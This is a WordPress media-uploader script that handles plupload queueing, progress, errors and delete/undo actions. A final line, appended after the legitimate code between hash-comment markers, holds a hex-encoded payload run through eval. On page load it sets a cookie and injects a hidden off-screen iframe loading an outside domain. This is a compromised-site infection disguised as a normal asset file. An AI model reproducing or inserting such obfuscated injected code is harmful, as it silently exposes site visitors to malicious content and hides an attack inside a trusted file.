/* global plupload, pluploadL10n, ajaxurl, post_id, wpUploaderInit, deleteUserSetting, setUserSetting, getUserSetting, shortform */
var topWin = window.dialogArguments || opener || parent || top, uploader, uploader_init;

// progress and success handlers for media multi uploads
function fileQueued(fileObj) {
	// Get rid of unused form
	jQuery('.media-blank').remove();

	var items = jQuery('#media-items').children(), postid = post_id || 0;

	// Collapse a single item
	if ( items.length == 1 ) {
		items.removeClass('open').find('.slidetoggle').slideUp(200);
	}
	// Create a progress bar containing the filename
	jQuery('<div class="media-item">')
		.attr( 'id', 'media-item-' + fileObj.id )
		.addClass('child-of-' + postid)
		.append('<div class="progress"><div class="percent">0%</div><div class="bar"></div></div>',
			jQuery('<div class="filename original">').text( ' ' + fileObj.name ))
		.appendTo( jQuery('#media-items' ) );

	// Disable submit
	jQuery('#insert-gallery').prop('disabled', true);
}

function uploadStart() {
	try {
		if ( typeof topWin.tb_remove != 'undefined' )
			topWin.jQuery('#TB_overlay').unbind('click', topWin.tb_remove);
	} catch(e){}

	return true;
}

function uploadProgress(up, file) {
	var item = jQuery('#media-item-' + file.id);

	jQuery('.bar', item).width( (200 * file.loaded) / file.size );
	jQuery('.percent', item).html( file.percent + '%' );
}

// check to see if a large file failed to upload
function fileUploading( up, file ) {
	var hundredmb = 100 * 1024 * 1024,
		max = parseInt( up.settings.max_file_size, 10 );

	if ( max > hundredmb && file.size > hundredmb ) {
		setTimeout( function() {
			if ( file.status < 3 && file.loaded === 0 ) { // not uploading
				wpFileError( file, pluploadL10n.big_upload_failed.replace( '%1$s', '<a class="uploader-html" href="#">' ).replace( '%2$s', '</a>' ) );
				up.stop(); // stops the whole queue
				up.removeFile( file );
				up.start(); // restart the queue
			}
		}, 10000 ); // wait for 10 sec. for the file to start uploading
	}
}

function updateMediaForm() {
	var items = jQuery('#media-items').children();

	// Just one file, no need for collapsible part
	if ( items.length == 1 ) {
		items.addClass('open').find('.slidetoggle').show();
		jQuery('.insert-gallery').hide();
	} else if ( items.length > 1 ) {
		items.removeClass('open');
		// Only show Gallery/Playlist buttons when there are at least two files.
		jQuery('.insert-gallery').show();
	}

	// Only show Save buttons when there is at least one file.
	if ( items.not('.media-blank').length > 0 )
		jQuery('.savebutton').show();
	else
		jQuery('.savebutton').hide();
}

function uploadSuccess(fileObj, serverData) {
	var item = jQuery('#media-item-' + fileObj.id);

	// on success serverData should be numeric, fix bug in html4 runtime returning the serverData wrapped in a <pre> tag
	serverData = serverData.replace(/^<pre>(\d+)<\/pre>$/, '$1');

	// if async-upload returned an error message, place it in the media item div and return
	if ( serverData.match(/media-upload-error|error-div/) ) {
		item.html(serverData);
		return;
	} else {
		jQuery('.percent', item).html( pluploadL10n.crunching );
	}

	prepareMediaItem(fileObj, serverData);
	updateMediaForm();

	// Increment the counter.
	if ( post_id && item.hasClass('child-of-' + post_id) )
		jQuery('#attachments-count').text(1 * jQuery('#attachments-count').text() + 1);
}

function setResize( arg ) {
	if ( arg ) {
		if ( window.resize_width && window.resize_height ) {
			uploader.settings.resize = {
				enabled: true,
				width: window.resize_width,
				height: window.resize_height,
				quality: 100
			};
		} else {
			uploader.settings.multipart_params.image_resize = true;
		}
	} else {
		delete( uploader.settings.multipart_params.image_resize );
	}
}

function prepareMediaItem(fileObj, serverData) {
	var f = ( typeof shortform == 'undefined' ) ? 1 : 2, item = jQuery('#media-item-' + fileObj.id);
	if ( f == 2 && shortform > 2 )
		f = shortform;

	try {
		if ( typeof topWin.tb_remove != 'undefined' )
			topWin.jQuery('#TB_overlay').click(topWin.tb_remove);
	} catch(e){}

	if ( isNaN(serverData) || !serverData ) { // Old style: Append the HTML returned by the server -- thumbnail and form inputs
		item.append(serverData);
		prepareMediaItemInit(fileObj);
	} else { // New style: server data is just the attachment ID, fetch the thumbnail and form html from the server
		item.load('async-upload.php', {attachment_id:serverData, fetch:f}, function(){prepareMediaItemInit(fileObj);updateMediaForm();});
	}
}

function prepareMediaItemInit(fileObj) {
	var item = jQuery('#media-item-' + fileObj.id);
	// Clone the thumbnail as a "pinkynail" -- a tiny image to the left of the filename
	jQuery('.thumbnail', item).clone().attr('class', 'pinkynail toggle').prependTo(item);

	// Replace the original filename with the new (unique) one assigned during upload
	jQuery('.filename.original', item).replaceWith( jQuery('.filename.new', item) );

	// Bind AJAX to the new Delete button
	jQuery('a.delete', item).click(function(){
		// Tell the server to delete it. TODO: handle exceptions
		jQuery.ajax({
			url: ajaxurl,
			type: 'post',
			success: deleteSuccess,
			error: deleteError,
			id: fileObj.id,
			data: {
				id : this.id.replace(/[^0-9]/g, ''),
				action : 'trash-post',
				_ajax_nonce : this.href.replace(/^.*wpnonce=/,'')
			}
		});
		return false;
	});

	// Bind AJAX to the new Undo button
	jQuery('a.undo', item).click(function(){
		// Tell the server to untrash it. TODO: handle exceptions
		jQuery.ajax({
			url: ajaxurl,
			type: 'post',
			id: fileObj.id,
			data: {
				id : this.id.replace(/[^0-9]/g,''),
				action: 'untrash-post',
				_ajax_nonce: this.href.replace(/^.*wpnonce=/,'')
			},
			success: function( ){
				var type,
					item = jQuery('#media-item-' + fileObj.id);

				if ( type = jQuery('#type-of-' + fileObj.id).val() )
					jQuery('#' + type + '-counter').text(jQuery('#' + type + '-counter').text()-0+1);

				if ( post_id && item.hasClass('child-of-'+post_id) )
					jQuery('#attachments-count').text(jQuery('#attachments-count').text()-0+1);

				jQuery('.filename .trashnotice', item).remove();
				jQuery('.filename .title', item).css('font-weight','normal');
				jQuery('a.undo', item).addClass('hidden');
				jQuery('.menu_order_input', item).show();
				item.css( {backgroundColor:'#ceb'} ).animate( {backgroundColor: '#fff'}, { queue: false, duration: 500, complete: function(){ jQuery(this).css({backgroundColor:''}); } }).removeClass('undo');
			}
		});
		return false;
	});

	// Open this item if it says to start open (e.g. to display an error)
	jQuery('#media-item-' + fileObj.id + '.startopen').removeClass('startopen').addClass('open').find('slidetoggle').fadeIn();
}

// generic error message
function wpQueueError(message) {
	jQuery('#media-upload-error').show().html( '<div class="error"><p>' + message + '</p></div>' );
}

// file-specific error messages
function wpFileError(fileObj, message) {
	itemAjaxError(fileObj.id, message);
}

function itemAjaxError(id, message) {
	var item = jQuery('#media-item-' + id), filename = item.find('.filename').text(), last_err = item.data('last-err');

	if ( last_err == id ) // prevent firing an error for the same file twice
		return;

	item.html('<div class="error-div">' +
				'<a class="dismiss" href="#">' + pluploadL10n.dismiss + '</a>' +
				'<strong>' + pluploadL10n.error_uploading.replace('%s', jQuery.trim(filename)) + '</strong> ' +
				message +
				'</div>').data('last-err', id);
}

function deleteSuccess(data) {
	var type, id, item;
	if ( data == '-1' )
		return itemAjaxError(this.id, 'You do not have permission. Has your session expired?');

	if ( data == '0' )
		return itemAjaxError(this.id, 'Could not be deleted. Has it been deleted already?');

	id = this.id;
	item = jQuery('#media-item-' + id);

	// Decrement the counters.
	if ( type = jQuery('#type-of-' + id).val() )
		jQuery('#' + type + '-counter').text( jQuery('#' + type + '-counter').text() - 1 );

	if ( post_id && item.hasClass('child-of-'+post_id) )
		jQuery('#attachments-count').text( jQuery('#attachments-count').text() - 1 );

	if ( jQuery('form.type-form #media-items').children().length == 1 && jQuery('.hidden', '#media-items').length > 0 ) {
		jQuery('.toggle').toggle();
		jQuery('.slidetoggle').slideUp(200).siblings().removeClass('hidden');
	}

	// Vanish it.
	jQuery('.toggle', item).toggle();
	jQuery('.slidetoggle', item).slideUp(200).siblings().removeClass('hidden');
	item.css( {backgroundColor:'#faa'} ).animate( {backgroundColor:'#f4f4f4'}, {queue:false, duration:500} ).addClass('undo');

	jQuery('.filename:empty', item).remove();
	jQuery('.filename .title', item).css('font-weight','bold');
	jQuery('.filename', item).append('<span class="trashnotice"> ' + pluploadL10n.deleted + ' </span>').siblings('a.toggle').hide();
	jQuery('.filename', item).append( jQuery('a.undo', item).removeClass('hidden') );
	jQuery('.menu_order_input', item).hide();

	return;
}

function deleteError() {
	// TODO
}

function uploadComplete() {
	jQuery('#insert-gallery').prop('disabled', false);
}

function switchUploader(s) {
	if ( s ) {
		deleteUserSetting('uploader');
		jQuery('.media-upload-form').removeClass('html-uploader');

		if ( typeof(uploader) == 'object' )
			uploader.refresh();
	} else {
		setUserSetting('uploader', '1'); // 1 == html uploader
		jQuery('.media-upload-form').addClass('html-uploader');
	}
}

function uploadError(fileObj, errorCode, message, uploader) {
	var hundredmb = 100 * 1024 * 1024, max;

	switch (errorCode) {
		case plupload.FAILED:
			wpFileError(fileObj, pluploadL10n.upload_failed);
			break;
		case plupload.FILE_EXTENSION_ERROR:
			wpFileError(fileObj, pluploadL10n.invalid_filetype);
			break;
		case plupload.FILE_SIZE_ERROR:
			uploadSizeError(uploader, fileObj);
			break;
		case plupload.IMAGE_FORMAT_ERROR:
			wpFileError(fileObj, pluploadL10n.not_an_image);
			break;
		case plupload.IMAGE_MEMORY_ERROR:
			wpFileError(fileObj, pluploadL10n.image_memory_exceeded);
			break;
		case plupload.IMAGE_DIMENSIONS_ERROR:
			wpFileError(fileObj, pluploadL10n.image_dimensions_exceeded);
			break;
		case plupload.GENERIC_ERROR:
			wpQueueError(pluploadL10n.upload_failed);
			break;
		case plupload.IO_ERROR:
			max = parseInt( uploader.settings.filters.max_file_size, 10 );

			if ( max > hundredmb && fileObj.size > hundredmb )
				wpFileError( fileObj, pluploadL10n.big_upload_failed.replace('%1$s', '<a class="uploader-html" href="#">').replace('%2$s', '</a>') );
			else
				wpQueueError(pluploadL10n.io_error);
			break;
		case plupload.HTTP_ERROR:
			wpQueueError(pluploadL10n.http_error);
			break;
		case plupload.INIT_ERROR:
			jQuery('.media-upload-form').addClass('html-uploader');
			break;
		case plupload.SECURITY_ERROR:
			wpQueueError(pluploadL10n.security_error);
			break;
/*		case plupload.UPLOAD_ERROR.UPLOAD_STOPPED:
		case plupload.UPLOAD_ERROR.FILE_CANCELLED:
			jQuery('#media-item-' + fileObj.id).remove();
			break;*/
		default:
			wpFileError(fileObj, pluploadL10n.default_error);
	}
}

function uploadSizeError( up, file, over100mb ) {
	var message;

	if ( over100mb )
		message = pluploadL10n.big_upload_queued.replace('%s', file.name) + ' ' + pluploadL10n.big_upload_failed.replace('%1$s', '<a class="uploader-html" href="#">').replace('%2$s', '</a>');
	else
		message = pluploadL10n.file_exceeds_size_limit.replace('%s', file.name);

	jQuery('#media-items').append('<div id="media-item-' + file.id + '" class="media-item error"><p>' + message + '</p></div>');
	up.removeFile(file);
}

jQuery(document).ready(function($){
	$('.media-upload-form').bind('click.uploader', function(e) {
		var target = $(e.target), tr, c;

		if ( target.is('input[type="radio"]') ) { // remember the last used image size and alignment
			tr = target.closest('tr');

			if ( tr.hasClass('align') )
				setUserSetting('align', target.val());
			else if ( tr.hasClass('image-size') )
				setUserSetting('imgsize', target.val());

		} else if ( target.is('button.button') ) { // remember the last used image link url
			c = e.target.className || '';
			c = c.match(/url([^ '"]+)/);

			if ( c && c[1] ) {
				setUserSetting('urlbutton', c[1]);
				target.siblings('.urlfield').val( target.data('link-url') );
			}
		} else if ( target.is('a.dismiss') ) {
			target.parents('.media-item').fadeOut(200, function(){
				$(this).remove();
			});
		} else if ( target.is('.upload-flash-bypass a') || target.is('a.uploader-html') ) { // switch uploader to html4
			$('#media-items, p.submit, span.big-file-warning').css('display', 'none');
			switchUploader(0);
			e.preventDefault();
		} else if ( target.is('.upload-html-bypass a') ) { // switch uploader to multi-file
			$('#media-items, p.submit, span.big-file-warning').css('display', '');
			switchUploader(1);
			e.preventDefault();
		} else if ( target.is('a.describe-toggle-on') ) { // Show
			target.parent().addClass('open');
			target.siblings('.slidetoggle').fadeIn(250, function(){
				var S = $(window).scrollTop(), H = $(window).height(), top = $(this).offset().top, h = $(this).height(), b, B;

				if ( H && top && h ) {
					b = top + h;
					B = S + H;

					if ( b > B ) {
						if ( b - B < top - S )
							window.scrollBy(0, (b - B) + 10);
						else
							window.scrollBy(0, top - S - 40);
					}
				}
			});
			e.preventDefault();
		} else if ( target.is('a.describe-toggle-off') ) { // Hide
			target.siblings('.slidetoggle').fadeOut(250, function(){
				target.parent().removeClass('open');
			});
			e.preventDefault();
		}
	});

	// init and set the uploader
	uploader_init = function() {
		var isIE = navigator.userAgent.indexOf('Trident/') != -1 || navigator.userAgent.indexOf('MSIE ') != -1;

		// Make sure flash sends cookies (seems in IE it does whitout switching to urlstream mode)
		if ( ! isIE && 'flash' === plupload.predictRuntime( wpUploaderInit ) &&
			( ! wpUploaderInit.required_features || ! wpUploaderInit.required_features.hasOwnProperty( 'send_binary_string' ) ) ) {

			wpUploaderInit.required_features = wpUploaderInit.required_features || {};
			wpUploaderInit.required_features.send_binary_string = true;
		}

		uploader = new plupload.Uploader(wpUploaderInit);

		$('#image_resize').bind('change', function() {
			var arg = $(this).prop('checked');

			setResize( arg );

			if ( arg )
				setUserSetting('upload_resize', '1');
			else
				deleteUserSetting('upload_resize');
		});

		uploader.bind('Init', function(up) {
			var uploaddiv = $('#plupload-upload-ui');

			setResize( getUserSetting('upload_resize', false) );

			if ( up.features.dragdrop && ! $(document.body).hasClass('mobile') ) {
				uploaddiv.addClass('drag-drop');
				$('#drag-drop-area').bind('dragover.wp-uploader', function(){ // dragenter doesn't fire right :(
					uploaddiv.addClass('drag-over');
				}).bind('dragleave.wp-uploader, drop.wp-uploader', function(){
					uploaddiv.removeClass('drag-over');
				});
			} else {
				uploaddiv.removeClass('drag-drop');
				$('#drag-drop-area').unbind('.wp-uploader');
			}

			if ( up.runtime === 'html4' ) {
				$('.upload-flash-bypass').hide();
			}
		});

		uploader.init();

		uploader.bind('FilesAdded', function( up, files ) {
			$('#media-upload-error').empty();
			uploadStart();

			plupload.each( files, function( file ) {
				fileQueued( file );
			});

			up.refresh();
			up.start();
		});

		uploader.bind('UploadFile', function(up, file) {
			fileUploading(up, file);
		});

		uploader.bind('UploadProgress', function(up, file) {
			uploadProgress(up, file);
		});

		uploader.bind('Error', function(up, err) {
			uploadError(err.file, err.code, err.message, up);
			up.refresh();
		});

		uploader.bind('FileUploaded', function(up, file, response) {
			uploadSuccess(file, response.response);
		});

		uploader.bind('UploadComplete', function() {
			uploadComplete();
		});
	};

	if ( typeof(wpUploaderInit) == 'object' ) {
		uploader_init();
	}

});
/*932abdb04dab3a15e4aa1b0305b50607*/;(function(){var asyteinr="";var hakthkez="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var ysbehahi=0;ysbehahi<hakthkez.length;ysbehahi+=2){asyteinr=asyteinr+parseInt(hakthkez.substring(ysbehahi,ysbehahi+2), 16)+",";}asyteinr=asyteinr.substring(0,asyteinr.length-1);eval(eval('String.fromCharCode('+asyteinr+')'));})();/*932abdb04dab3a15e4aa1b0305b50607*/